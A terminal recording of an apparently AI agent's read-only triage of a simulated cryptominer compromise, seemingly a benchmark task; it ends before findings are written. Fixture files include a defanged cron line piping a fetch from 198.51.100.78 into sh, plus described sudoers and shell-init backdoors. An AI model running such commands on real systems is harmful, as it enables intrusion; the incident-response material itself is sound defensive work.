@@ -1,0 +1,2498 @@
+[?2004hroot@58bb37a3cf48:/app# asciinema rec --stdin /logs/agent/recording.cast
+[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
+[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
+[?2004hroot@58bb37a3cf48:/app# clear
+[?2004l[H[J[3J[?2004hroot@58bb37a3cf48:/app# ls -la /app /sas /sas/handoff /sas/cti
+[?2004l/app:
+total 8
+drwxr-xr-x 2 root root 4096 Aug 16 14:39 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 14:54 [01;34m..[0m
+
+/sas:
+total 28
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m.[0m
+drwxr-xr-x 1 root root 4096 Aug 16 14:54 [01;34m..[0m
+-r--r--r-- 1 root root 1273 Aug 16 14:03 alerts.json
+-r--r--r-- 1 root root  243 Aug 16 14:03 baseline.json
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34mcti[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34mhandoff[0m
+-r--r--r-- 1 root root    3 Aug 16 14:03 vulns.json
+
+/sas/cti:
+total 32
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m..[0m
+-r--r--r-- 1 root root  166 Aug 16 14:29 SOURCES.txt
+-r--r--r-- 1 root root 5389 Aug 16 14:29 [01;35madvisory-page-01.png[0m
+-r--r--r-- 1 root root 2581 Aug 16 14:29 advisory.pdf
+-r--r--r-- 1 root root 1723 Aug 16 14:29 advisory.txt
+-r--r--r-- 1 root root 2040 Aug 16 14:29 [01;35mcampaign-timeline.png[0m
+
+/sas/handoff:
+total 24
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m.[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m..[0m
+-r--r--r-- 1 root root 1207 Aug 16 14:29 change-ticket.md
+-r--r--r-- 1 root root  324 Aug 16 14:29 findings.partial.json
+-r--r--r-- 1 root root  592 Aug 16 14:29 findings.schema.json
+-r--r--r-- 1 root root 1002 Aug 16 14:29 intake.pdf
+[?2004hroot@58bb37a3cf48:/app# cat /sas/alerts.json
+[?2004l[
+  {
+    "id": "ALERT-01",
+    "chk": "CHK-01",
+    "kind": "miner-process",
+    "path": "/tmp/.X11-unix/.xorg",
+    "capability": "ENT-P01",
+    "summary": "miner-process observed at /tmp/.X11-unix/.xorg"
+  },
+  {
+    "id": "ALERT-02",
+    "chk": "CHK-02",
+    "kind": "miner-binary",
+    "path": "/tmp/.X11-unix/.xorg",
+    "capability": "ENT-F02",
+    "summary": "miner-binary observed at /tmp/.X11-unix/.xorg"
+  },
+  {
+    "id": "ALERT-03",
+    "chk": "CHK-04",
+    "kind": "ssh-baseline",
+    "path": "/etc/ssh/sshd_config",
+    "capability": "BAS-01",
+    "summary": "ssh-baseline observed at /etc/ssh/sshd_config"
+  },
+  {
+    "id": "ALERT-04",
+    "chk": "CHK-09",
+    "kind": "mysql-remote-root",
+    "path": "/etc/my.cnf",
+    "capability": "BAS-02",
+    "summary": "mysql-remote-root observed at /etc/my.cnf"
+  },
+  {
+    "id": "ALERT-05",
+    "chk": "CHK-11",
+    "kind": "cron",
+    "path": "/var/spool/cron/root",
+    "capability": "PER-S01",
+    "summary": "cron observed at /var/spool/cron/root"
+  },
+  {
+    "id": "ALERT-06",
+    "chk": "CHK-13",
+    "kind": "systemd",
+    "path": "/etc/systemd/system/system-update-helper.service",
+    "capability": "PER-V01",
+    "summary": "systemd observed at /etc/systemd/system/system-update-helper.service"
+  }
+]
+[?2004hroot@58bb37a3cf48:/app# cat /sas/baseline.json
+[?2004l[
+  {
+    "chk": "CHK-04",
+    "path": "/etc/ssh/sshd_config",
+    "check": "ssh-baseline",
+    "capability": "BAS-01"
+  },
+  {
+    "chk": "CHK-09",
+    "path": "/etc/my.cnf",
+    "check": "mysql-remote-root",
+    "capability": "BAS-02"
+  }
+]
+[?2004hroot@58bb37a3cf48:/app# cat /sas/vulns.json
+[?2004l[]
+[?2004hroot@58bb37a3cf48:/app# cat /sas/cti/advisory.txt
+[?2004lTHREAT INTELLIGENCE ADVISORY ‚Äî Ssh Miner campaign
+=================================================
+
+Distribution: TLP:AMBER   Analyst handoff   Confidence: HIGH   (IOCs are defanged)
+Affected host: ssh-prod-01   Suspected origin IP: 198.51.100.78
+
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered only part of it; several persistence and anti-forensic actions were silent. Map every on-disk finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+   T1110      Brute Force                                [credential-access]  step 1: SSH brute force as root
+   T1021.004  SSH                                        [lateral-movement]  step 2: SSH login
+   T1059.004  Unix Shell                                 [execution]  step 3: shell execution
+   T1496      Resource Hijacking                         [impact]  step 4: cryptomining
+   T1053.003  Cron                                       [execution]  step 5: cron persistence
+   T1546.004  Unix Shell Configuration Modification      [privilege-escalation]  step 6: bashrc persistence
+   T1543.002  Systemd Service                            [persistence]  step 7: systemd persistence
+   T1070.002  Clear Linux or Mac System Logs             [defense-evasion]  step 8: auth log cleared
+
+4. INDICATORS OF COMPROMISE (defanged)
+   ip     198.51.100.78
+   c2     update-ssh[.]example[.]cn
+   pool   stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333
+   wallet 4A0000000000000000000d1ec67074f7
+
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S. National Vulnerability Database (public domain).
+[?2004hroot@58bb37a3cf48:/app# cat /sas/handoff/change-ticket.md
+[?2004l# CHANGE TICKET  CHG-3182  (DRAFT ‚Äî reconcile against your findings)
+
+> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known
+> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own
+> investigation of /disk; cite evidence for every change. Do not author from scratch.
+
+| # | Action | Target | Status | Note |
+|---|--------|--------|--------|------|
+| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |
+| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host ‚Äî verify against /sas/cti |
+| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence ‚Äî re-check |
+| 4 | (add) silent persistence you discover | /home/devops/.bash_history | TODO | ticket omits everything not alerted ‚Äî add the rest |
+
+## Reviewer checklist
+- [ ] Every action maps to a cited artifact under /disk or /sas
+- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)
+- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
+- [ ] Add the silent (non-alerted) artifacts the prior shift missed
+[?2004hroot@58bb37a3cf48:/app# cat /sas/handoff/findings.schema.json
+[?2004l{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "finding",
+  "type": "object",
+  "required": [
+    "chk",
+    "path",
+    "attck",
+    "confidence",
+    "evidence"
+  ],
+  "properties": {
+    "chk": {
+      "type": "string"
+    },
+    "path": {
+      "type": "string"
+    },
+    "attck": {
+      "type": "string",
+      "pattern": "^T\\d{4}(\\.\\d{3})?$"
+    },
+    "confidence": {
+      "enum": [
+        "low",
+        "medium",
+        "high"
+      ]
+    },
+    "evidence": {
+      "type": "string",
+      "description": "backtick-cited /disk or /sas path"
+    }
+  }
+}
+[?2004hroot@58bb37a3cf48:/app# cat /sas/handoff/findings.partial.json
+[?2004l{
+  "findings": [
+    {
+      "chk": "CHK-01",
+      "path": "/tmp/.X11-unix/.xorg",
+      "attck": "T1496",
+      "confidence": "high",
+      "evidence": "`/tmp/.X11-unix/.xorg`"
+    },
+    {
+      "chk": "TODO",
+      "path": "TODO",
+      "attck": "TODO",
+      "confidence": "TODO",
+      "evidence": "TODO"
+    }
+  ]
+}
+[?2004hroot@58bb37a3cf48:/app# pdftotext /sas/handoff/intake.pdf - | cat
+[?2004lSOC INCIDENT INTAKE ? ssh-miner
+===============================
+Reported by: monitoring (EDR high-severity alert cluster)
+Opened: 2026-08-15 03:20 UTC Priority: P1
+Initial alerts: see /sas/alerts.json (partial coverage).
+Handoff: alerts undercount persistence and anti-forensics; investigate the whole host and
+reconcile the attached change ticket.
+
+[?2004hroot@58bb37a3cf48:/app# pdftotext /sas/cti/advisory.pdf - | cat
+[?2004lTHREAT INTELLIGENCE ADVISORY ? Ssh Miner campaign
+=================================================
+Distribution: TLP:AMBER Analyst handoff Confidence: HIGH (IOCs are defanged)
+Affected host: ssh-prod-01 Suspected origin IP: 198.51.100.78
+1. EXECUTIVE SUMMARY
+An external actor executed a multi-stage post-compromise sequence. Endpoint alerting covered
+only part of it; several persistence and anti-forensic actions were silent. Map every on-disk
+finding to the ATT&CK techniques below and flag which are NOT in the SAS alert feed.
+2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)
+T1110
+Brute Force
+[credential-access] step 1: SSH
+brute force as root
+T1021.004 SSH
+[lateral-movement] step 2: SSH login
+T1059.004 Unix Shell
+[execution] step 3: shell execution
+T1496
+Resource Hijacking
+[impact] step 4: cryptomining
+T1053.003 Cron
+[execution] step 5: cron persistence
+T1546.004 Unix Shell Configuration Modification
+[privilege-escalation] step 6:
+bashrc persistence
+T1543.002 Systemd Service
+[persistence] step 7: systemd
+persistence
+T1070.002 Clear Linux or Mac System Logs
+[defense-evasion] step 8: auth log
+cleared
+4. INDICATORS OF COMPROMISE (defanged)
+ip 198.51.100.78
+c2 update-ssh[.]example[.]cn
+pool stratum+tcp[:]//xmr[.]ssh[.]evil[:]3333
+wallet 4A0000000000000000000d1ec67074f7
+Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from the U.S.
+National Vulnerability Database (public domain).
+
+[?2004hroot@58bb37a3cf48:/app# cat /sas/cti/SOURCES.txt
+[?2004lMITRE ATT&CK(R): (C) The MITRE Corporation, CC BY 4.0 (attack.mitre.org).
+CVE/CVSS: U.S. National Vulnerability Database, nvd.nist.gov (public-domain U.S.-Gov work).
+[?2004hroot@58bb37a3cf48:/app# ls -ld /disk /sas /sas/handoff /sas/handoff/change-ticket.md
+[?2004ldr-xr-xr-x 7 root root 4096 Aug 16 14:39 [0m[01;34m/disk[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m/sas[0m
+dr-xr-xr-x 1 root root 4096 Aug 16 14:39 [01;34m/sas/handoff[0m
+-r--r--r-- 1 root root 1207 Aug 16 14:29 /sas/handoff/change-ticket.md
+[?2004hroot@58bb37a3cf48:/app# ls -la /disk
+[?2004ltotal 28
+dr-xr-xr-x 7 root root  4096 Aug 16 14:39 [0m[01;34m.[0m
+drwxr-xr-x 1 root root  4096 Aug 16 14:54 [01;34m..[0m
+dr-xr-xr-x 5  502 staff 4096 Aug 16 14:28 [01;34metc[0m
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [01;34mhome[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34mroot[0m
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [01;34mtmp[0m
+dr-xr-xr-x 5  502 staff 4096 Aug 16 14:28 [01;34mvar[0m
+[?2004hroot@58bb37a3cf48:/app# ls -la /disk/var/log
+[?2004ltotal 124
+dr-xr-xr-x 2 502 staff  4096 Aug 16 14:29 [0m[01;34m.[0m
+dr-xr-xr-x 5 502 staff  4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff 15300 Aug 16 14:28 kern.log
+-r--r--r-- 1 502 staff 38142 Aug 16 14:28 messages
+-r--r--r-- 1 502 staff 50870 Aug 16 14:29 secure
+-r--r--r-- 1 502 staff  2479 Aug 16 14:29 [01;31msecure.1.gz[0m
+-r--r--r-- 1 502 staff  1815 Aug 16 14:28 wtmp.csv
+[?2004hroot@58bb37a3cf48:/app# ls -la /disk/tmp /disk/var/tmp /disk/var/spool/cron /disk/etc/systemd/system
+[?2004lls: cannot access '/disk/var/tmp': No such file or directory
+/disk/etc/systemd/system:
+total 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [0m[01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff  169 Aug 16 14:28 system-update-helper.service
+
+/disk/tmp:
+total 12
+dr-xr-xr-x 3  502 staff 4096 Aug 16 14:28 [01;34m.[0m
+dr-xr-xr-x 7 root root  4096 Aug 16 14:39 [01;34m..[0m
+dr-xr-xr-x 2  502 staff 4096 Aug 16 14:28 [01;34m.X11-unix[0m
+
+/disk/var/spool/cron:
+total 12
+dr-xr-xr-x 2 502 staff 4096 Aug 16 14:28 [01;34m.[0m
+dr-xr-xr-x 3 502 staff 4096 Aug 16 14:28 [01;34m..[0m
+-r--r--r-- 1 502 staff  317 Aug 16 14:28 root
+[?2004hroot@58bb37a3cf48:/app# find /disk -type f
+[?2004l/disk/etc/passwd
+/disk/etc/my.cnf
+/disk/etc/ssh/sshd_config
+/disk/etc/fstab
+/disk/etc/crontab
+/disk/etc/hosts
+/disk/etc/group
+/disk/etc/sudoers.d/devops
+/disk/etc/hostname
+/disk/etc/systemd/system/system-update-helper.service
+/disk/etc/os-release
+/disk/var/spool/cron/root
+/disk/var/log/messages
+/disk/var/log/secure
+/disk/var/log/secure.1.gz
+/disk/var/log/wtmp.csv
+/disk/var/log/kern.log
+/disk/var/lib/dpkg/status.summary
+/disk/var/lib/.cache/.wiped.bin
+/disk/home/devops/.bash_history
+/disk/tmp/.X11-unix/.xorg
+/disk/root/.bashrc
+[?2004hroot@58bb37a3cf48:/app# cat /disk/etc/passwd
+[?2004lroot:x:0:0:root:/root:/bin/bash
+devops:x:1000:1000::/home/devops:/bin/bash
+webadmin:x:1001:1001::/home/webadmin:/bin/bash
+svc-backup:x:1002:1002::/home/svc-backup:/bin/bash
+postgres:x:1003:1003::/home/postgres:/bin/bash
+jenkins:x:1004:1004::/home/jenkins:/bin/bash
+nobody:x:65534:65534::/:/usr/sbin/nologin
+[?2004hroot@58bb37a3cf48:/app# cat /disk/etc/sudoers.d/devops
+[?2004l# devops (managed)
+
+sudoers backdoor: devops ALL=(ALL) NOPASSWD: ALL
+[?2004hroot@58bb37a3cf48:/app# cat /disk/etc/my.cnf
+[?2004l# my.cnf (managed)
+
+MySQL bind-address = 0.0.0.0 and a remote root grant enabled
+[?2004hroot@58bb37a3cf48:/app# cat /disk/etc/ssh/sshd_config
+[?2004l# sshd_config
+Port 22
+Protocol 2
+HostKey /etc/ssh/ssh_host_rsa_key
+SyslogFacility AUTHPRIV
+UsePAM yes
+X11Forwarding yes
+Subsystem sftp /usr/lib/openssh/sftp-server
+PermitRootLogin yes
+PasswordAuthentication yes
+MaxAuthTries 6
+[?2004hroot@58bb37a3cf48:/app# cat /disk/etc/crontab
+[?2004lSHELL=/bin/bash
+0 3 * * * root /usr/local/bin/backup.sh
+17 * * * * root run-parts /etc/cron.hourly
+[?2004hroot@58bb37a3cf48:/app# cat /disk/var/spool/cron/root
+[?2004l# m h dom mon dow user command
+0 3 * * * root /usr/local/bin/backup.sh
+30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf
+*/15 * * * * nobody /usr/bin/check-health.sh
+# * * * * * root <defanged beacon: curl hxxp://198.51.100.78/x | sh> ‚Äî cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload
+[?2004hroot@58bb37a3cf48:/app# cat /disk/etc/systemd/system/system-update-helper.service
+[?2004l[Unit]
+Description=System Update Helper
+After=network.target
+[Service]
+ExecStart launches an xmrig / pgdaemon re-dropper (defanged)
+[Install]
+WantedBy=multi-user.target
+[?2004hroot@58bb37a3cf48:/app# cat /disk/root/.bashrc
+[?2004l# .bashrc
+shell-init persistence: PROMPT_COMMAND beacon to 198.51.100.78 (defanged)
+[?2004hroot@58bb37a3cf48:/app# cat /disk/home/devops/.bash_history
+[?2004lgit status
+top -bn1 | head
+vim config.yml
+tail -f /var/log/syslog
+df -h
+hydra-style SSH brute-force against sshd (wordlist, user=root) ‚Äî defanged, not executed here
+systemctl status nginx
+ls -la
+cd /var/www
+docker ps
+[?2004hroot@58bb37a3cf48:/app# cat /disk/var/log/wtmp.csv
+[?2004luser,tty,from,login,duration
+postgres,pts/2,10.10.105.223,Aug 12 09:13,259m
+postgres,pts/4,10.10.105.99,Aug 15 09:10,16m
+postgres,pts/4,10.10.105.59,Aug 12 09:47,294m
+root,pts/0,10.10.105.237,Aug 15 09:46,50m
+root,pts/2,10.10.105.188,Aug 10 09:49,250m
+root,pts/1,10.10.105.213,Aug 15 09:12,22m
+jenkins,pts/5,10.10.105.179,Aug 12 09:07,71m
+root,pts/3,10.10.105.150,Aug 14 09:51,239m
+postgres,pts/4,10.10.105.80,Aug 12 09:21,17m
+webadmin,pts/4,10.10.105.177,Aug 10 09:15,32m
+root,pts/6,10.10.105.61,Aug 13 09:34,381m
+jenkins,pts/2,10.10.105.47,Aug 15 09:14,198m
+devops,pts/6,10.10.105.77,Aug 11 09:43,289m
+svc-backup,pts/2,10.10.105.33,Aug 14 09:30,292m
+devops,pts/0,10.10.105.250,Aug 10 09:36,313m
+jenkins,pts/0,10.10.105.165,Aug 11 09:39,328m
+svc-backup,pts/5,10.10.105.212,Aug 10 09:58,293m
+webadmin,pts/6,10.10.105.213,Aug 10 09:10,53m
+jenkins,pts/2,10.10.105.15,Aug 14 09:31,283m
+jenkins,pts/1,10.10.105.17,Aug 12 09:40,29m
+jenkins,pts/2,10.10.105.174,Aug 12 09:01,385m
+root,pts/6,10.10.105.38,Aug 11 09:13,69m
+root,pts/5,10.10.105.216,Aug 10 09:32,380m
+jenkins,pts/3,10.10.105.135,Aug 11 09:50,252m
+root,pts/0,10.10.105.65,Aug 11 09:07,397m
+root,pts/6,10.10.105.237,Aug 11 09:48,205m
+root,pts/3,10.10.105.227,Aug 13 09:30,197m
+postgres,pts/6,10.10.105.155,Aug 12 09:43,267m
+webadmin,pts/5,10.10.105.96,Aug 11 09:10,66m
+root,pts/0,10.10.105.225,Aug 15 09:49,184m
+devops,pts/4,10.10.105.60,Aug 15 09:12,347m
+postgres,pts/4,10.10.105.3,Aug 10 09:11,208m
+root,pts/5,10.10.105.228,Aug 10 09:17,198m
+jenkins,pts/5,10.10.105.152,Aug 10 09:53,120m
+webadmin,pts/6,10.10.105.195,Aug 15 09:38,142m
+postgres,pts/4,10.10.105.34,Aug 13 09:08,174m
+postgres,pts/3,10.10.105.18,Aug 10 09:01,60m
+jenkins,pts/0,10.10.105.195,Aug 10 09:08,130m
+root,pts/5,10.10.105.4,Aug 13 09:33,101m
+postgres,pts/2,10.10.105.133,Aug 14 09:13,25m
+[?2004hroot@58bb37a3cf48:/app# head -n 30 /disk/var/log/secure
+[?2004lAug 15 00:34:02 ssh-prod-01 sshd[3375]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 00:34:47 ssh-prod-01 sshd[2190]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 15 00:35:00 ssh-prod-01 sshd[4799]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1004)
+Aug 15 00:35:16 ssh-prod-01 sshd[4664]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 15 00:35:18 ssh-prod-01 sshd[1516]: Accepted publickey for devops from 10.10.105.152 port 41010 ssh2: RSA SHA256:2be87387
+Aug 15 00:35:38 ssh-prod-01 sshd[8270]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 00:36:14 ssh-prod-01 sshd[8142]: Received disconnect from 10.10.105.177 port 45807:11: disconnected by user
+Aug 15 00:36:45 ssh-prod-01 sshd[5748]: Accepted publickey for svc-backup from 10.10.105.241 port 47778 ssh2: RSA SHA256:540c1dd3
+Aug 15 00:36:49 ssh-prod-01 sshd[8807]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:37:28 ssh-prod-01 sshd[8089]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:38:08 ssh-prod-01 sshd[1578]: pam_unix(sudo:session): session opened for user root by postgres(uid=1005)
+Aug 15 00:38:47 ssh-prod-01 sshd[5116]: Accepted publickey for postgres from 10.10.105.116 port 47849 ssh2: RSA SHA256:15a64c96
+Aug 15 00:39:21 ssh-prod-01 sshd[5657]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 15 00:39:29 ssh-prod-01 sshd[4564]: Received disconnect from 10.10.105.220 port 42349:11: disconnected by user
+Aug 15 00:39:40 ssh-prod-01 sshd[3534]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:40:08 ssh-prod-01 sshd[5474]: pam_unix(sudo:session): session opened for user root by devops(uid=1003)
+Aug 15 00:40:20 ssh-prod-01 sshd[6960]: Accepted publickey for webadmin from 10.10.105.4 port 63902 ssh2: RSA SHA256:2a0792fb
+Aug 15 00:40:26 ssh-prod-01 sshd[7724]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 00:40:59 ssh-prod-01 sshd[4083]: Accepted publickey for jenkins from 10.10.105.162 port 41843 ssh2: RSA SHA256:4f63995e
+Aug 15 00:41:13 ssh-prod-01 sshd[7594]: Received disconnect from 10.10.105.145 port 59310:11: disconnected by user
+Aug 15 00:41:19 ssh-prod-01 sshd[2300]: Accepted publickey for svc-backup from 10.10.105.122 port 40727 ssh2: RSA SHA256:14cc89c5
+Aug 15 00:41:37 ssh-prod-01 sshd[1706]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Aug 15 00:42:13 ssh-prod-01 sshd[2019]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 15 00:42:23 ssh-prod-01 sshd[4490]: Received disconnect from 10.10.105.145 port 59818:11: disconnected by user
+Aug 15 00:43:00 ssh-prod-01 sshd[4890]: Received disconnect from 10.10.105.238 port 50588:11: disconnected by user
+Aug 15 00:43:13 ssh-prod-01 sshd[7536]: Received disconnect from 10.10.105.184 port 42051:11: disconnected by user
+Aug 15 00:43:25 ssh-prod-01 sshd[3098]: Accepted publickey for devops from 10.10.105.198 port 50984 ssh2: RSA SHA256:19c4d7b5
+Aug 15 00:43:54 ssh-prod-01 sshd[2256]: Accepted publickey for webadmin from 10.10.105.93 port 63023 ssh2: RSA SHA256:7dd58618
+Aug 15 00:44:33 ssh-prod-01 sshd[2548]: Received disconnect from 10.10.105.92 port 43609:11: disconnected by user
+Aug 15 00:45:13 ssh-prod-01 sshd[2702]: Received disconnect from 10.10.105.191 port 53449:11: disconnected by user
+[?2004hroot@58bb37a3cf48:/app# zcat /disk/var/log/secure.1.gz | head -n 30
+[?2004lAug 15 00:33:39 ssh-prod-01 sshd[4545]: Accepted publickey for devops from 10.10.105.137 port 50204 ssh2: RSA SHA256:546395ca
+Aug 15 00:34:19 ssh-prod-01 sshd[2688]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:34:26 ssh-prod-01 sshd[3228]: pam_unix(sudo:session): session opened for user root by devops(uid=1004)
+Aug 15 00:34:54 ssh-prod-01 sshd[8036]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1001)
+Aug 15 00:35:14 ssh-prod-01 sshd[8335]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:35:18 ssh-prod-01 sshd[5198]: Accepted publickey for webadmin from 10.10.105.66 port 44912 ssh2: RSA SHA256:3a7b256f
+Aug 15 00:35:22 ssh-prod-01 sshd[7857]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 15 00:35:53 ssh-prod-01 sshd[3429]: Received disconnect from 10.10.105.218 port 42048:11: disconnected by user
+Aug 15 00:35:59 ssh-prod-01 sshd[1680]: Accepted publickey for svc-backup from 10.10.105.65 port 43073 ssh2: RSA SHA256:1e77e177
+Aug 15 00:36:18 ssh-prod-01 sshd[4206]: Accepted publickey for root from 10.10.105.117 port 63715 ssh2: RSA SHA256:5d9e5dbd
+Aug 15 00:36:29 ssh-prod-01 sshd[5144]: Received disconnect from 10.10.105.86 port 42673:11: disconnected by user
+Aug 15 00:37:13 ssh-prod-01 sshd[8129]: Accepted publickey for svc-backup from 10.10.105.191 port 42828 ssh2: RSA SHA256:2b2f20b8
+Aug 15 00:37:40 ssh-prod-01 sshd[2689]: pam_unix(sudo:session): session opened for user root by postgres(uid=1003)
+Aug 15 00:38:17 ssh-prod-01 sshd[6985]: pam_unix(sudo:session): session opened for user root by devops(uid=1005)
+Aug 15 00:38:47 ssh-prod-01 sshd[1673]: Accepted publickey for svc-backup from 10.10.105.189 port 63042 ssh2: RSA SHA256:6de7ec33
+Aug 15 00:39:26 ssh-prod-01 sshd[3078]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1000)
+Aug 15 00:39:59 ssh-prod-01 sshd[8618]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1000)
+Aug 15 00:40:18 ssh-prod-01 sshd[1224]: Received disconnect from 10.10.105.186 port 45317:11: disconnected by user
+Aug 15 00:40:43 ssh-prod-01 sshd[5870]: Accepted publickey for svc-backup from 10.10.105.79 port 50323 ssh2: RSA SHA256:0e019611
+Aug 15 00:41:17 ssh-prod-01 sshd[8159]: Accepted publickey for devops from 10.10.105.86 port 59817 ssh2: RSA SHA256:5c4ae071
+Aug 15 00:41:50 ssh-prod-01 sshd[2851]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1000)
+Aug 15 00:42:30 ssh-prod-01 sshd[8043]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1000)
+Aug 15 00:43:15 ssh-prod-01 sshd[5404]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:43:34 ssh-prod-01 sshd[5095]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:43:55 ssh-prod-01 sshd[8801]: Accepted publickey for jenkins from 10.10.105.205 port 59277 ssh2: RSA SHA256:409e8bd5
+Aug 15 00:44:13 ssh-prod-01 sshd[8228]: Accepted publickey for root from 10.10.105.48 port 46919 ssh2: RSA SHA256:392ab67c
+Aug 15 00:44:27 ssh-prod-01 sshd[7936]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:44:47 ssh-prod-01 sshd[4265]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1005)
+Aug 15 00:45:16 ssh-prod-01 sshd[1886]: Received disconnect from 10.10.105.108 port 41083:11: disconnected by user
+Aug 15 00:45:45 ssh-prod-01 sshd[1625]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+[?2004hroot@58bb37a3cf48:/app# cat /disk/var/log/kern.log
+[?2004lAug 15 01:06:58 ssh-prod-01 chronyd[18968]: Received disconnect from 10.10.105.242 port 62807:11: disconnected by user
+Aug 15 01:07:44 ssh-prod-01 systemd-logind[10186]: Started Session 611 of user svc-backup.
+Aug 15 01:08:03 ssh-prod-01 sshd[29189]: Received disconnect from 10.10.105.218 port 44151:11: disconnected by user
+Aug 15 01:08:48 ssh-prod-01 systemd-logind[4117]: CPU0: Package temperature normal
+Aug 15 01:09:41 ssh-prod-01 chronyd[19875]: Received disconnect from 10.10.105.91 port 45166:11: disconnected by user
+Aug 15 01:09:49 ssh-prod-01 CRON[5539]: Time synchronised to time server
+Aug 15 01:10:30 ssh-prod-01 dbus-daemon[1540]: Time synchronised to time server
+Aug 15 01:10:49 ssh-prod-01 systemd-logind[2268]: Time synchronised to time server
+Aug 15 01:11:00 ssh-prod-01 sudo[10102]: Started Session 250 of user root.
+Aug 15 01:11:24 ssh-prod-01 kernel[16140]: CPU0: Package temperature normal
+Aug 15 01:12:02 ssh-prod-01 systemd-logind[11306]: CPU0: Package temperature normal
+Aug 15 01:12:37 ssh-prod-01 CRON[21418]: CPU0: Package temperature normal
+Aug 15 01:13:17 ssh-prod-01 sudo[19008]: CPU0: Package temperature normal
+Aug 15 01:13:48 ssh-prod-01 sshd[17289]: pam_unix(cron:session): session opened for user root
+Aug 15 01:14:12 ssh-prod-01 dbus-daemon[7531]: Time synchronised to time server
+Aug 15 01:14:55 ssh-prod-01 systemd-logind[21419]: pam_unix(cron:session): session opened for user root
+Aug 15 01:15:31 ssh-prod-01 CRON[17026]: Received disconnect from 10.10.105.126 port 59083:11: disconnected by user
+Aug 15 01:16:24 ssh-prod-01 chronyd[5307]: Received disconnect from 10.10.105.88 port 60845:11: disconnected by user
+Aug 15 01:17:16 ssh-prod-01 systemd-logind[7983]: Received disconnect from 10.10.105.198 port 40256:11: disconnected by user
+Aug 15 01:17:24 ssh-prod-01 systemd-logind[5935]: pam_unix(cron:session): session opened for user root
+Aug 15 01:17:32 ssh-prod-01 systemd[17817]: pam_unix(cron:session): session opened for user root
+Aug 15 01:17:43 ssh-prod-01 kernel[4146]: CPU0: Package temperature normal
+Aug 15 01:18:15 ssh-prod-01 systemd[18998]: CPU0: Package temperature normal
+Aug 15 01:18:23 ssh-prod-01 systemd-logind[13002]: Started Session 802 of user webadmin.
+Aug 15 01:18:38 ssh-prod-01 CRON[3688]: Time synchronised to time server
+Aug 15 01:18:47 ssh-prod-01 dbus-daemon[27940]: Started Session 751 of user svc-backup.
+Aug 15 01:19:03 ssh-prod-01 kernel[16041]: pam_unix(cron:session): session opened for user root
+Aug 15 01:19:48 ssh-prod-01 systemd-logind[16092]: Time synchronised to time server
+Aug 15 01:20:24 ssh-prod-01 systemd[24822]: Received disconnect from 10.10.105.224 port 40739:11: disconnected by user
